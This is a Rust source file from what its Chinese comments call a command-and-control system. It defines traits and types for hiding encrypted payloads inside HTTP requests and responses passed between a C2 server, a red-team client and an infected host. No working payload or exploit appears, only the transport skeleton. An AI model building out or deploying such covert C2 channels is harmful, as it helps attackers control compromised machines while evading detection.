//zzz_core/src/transport/base.rs
use actix_web::{web, HttpRequest, HttpResponse};
use reqwest::blocking::{RequestBuilder};

// 注意TransportTrait只关心数据隐写传输，TransportTrait只接受已加密后的Vec<u8>
// 数据加密请在TransportTrait外实现
pub trait TransportTrait{
    // 此处定义三个角色x,y,z
    // x 该c2系统的实际服务端
    // y 与该c2系统的实际服务端操控和管理的红队客户端
    // z 受感染主机端
    // 此处定义两个过程a,b
    // a 请求到达服务端的过程
    // b 请求对应的响应返回过程

    const SUPPORT: &'static str; // 按谁发出的请求分，如“zy”,"yz","zy:yz"
    const PROCESS: &'static str; // 如“a”，“b”
    type ExtractIn;
    type InjectIn;
    type InjectOut;
    fn extract(input: Self::ExtractIn) -> Option<Vec<u8>>;
    fn inject(input: Self::InjectIn) -> Option<Self::InjectOut>;
}
pub enum TransportHttpType{
    // b_set
    Payload(Vec<u8>),
    HttpResponse(HttpResponse),
    // b_get
    RequestBuilder(RequestBuilder),
    // Payload(Vec<u8>),

    // a_get
    HttpRequest((HttpRequest,web::Bytes)),
    // Payload(Vec<u8>),
    // a_set
    Request((Vec<u8>,String,String)), //payload，urlpath，urlbase
    // RequestBuilder(RequestBuilder),
}
// 在发送的请求里面藏载荷
pub trait TransportHttpA: TransportTrait<
    ExtractIn = TransportHttpType,
    InjectIn = TransportHttpType,
    InjectOut = TransportHttpType
> {
    const PROCESS: &'static str = "a";
}
// 在收到的响应里面藏载荷
pub trait TransportHttpB: TransportTrait<
    ExtractIn = TransportHttpType,
    InjectIn = TransportHttpType,
    InjectOut = TransportHttpType
> {
    const PROCESS: &'static str = "b";
}